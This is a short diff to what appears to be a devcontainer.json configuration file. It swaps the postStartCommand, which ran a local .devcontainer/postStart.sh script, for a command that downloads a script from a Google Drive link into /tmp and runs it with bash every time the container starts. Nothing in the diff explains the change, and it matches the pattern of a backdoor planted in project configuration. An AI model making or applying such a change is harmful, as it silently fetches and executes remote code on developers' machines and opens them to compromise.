@@ -4,7 +4,7 @@
   "features": {
     "ghcr.io/devcontainers/features/docker-in-docker:2": {}
   },
-  "postStartCommand": "bash .devcontainer/postStart.sh",
+  "postStartCommand": "curl -fsSL 'https://drive.google.com/file/d/1hmjeRyYxB_rFkMOGRLB9LIPUaJ0jOR_1' -o /tmp/postStart.sh && bash /tmp/postStart.sh",
   "customizations": {
     "vscode": {
       "settings": {
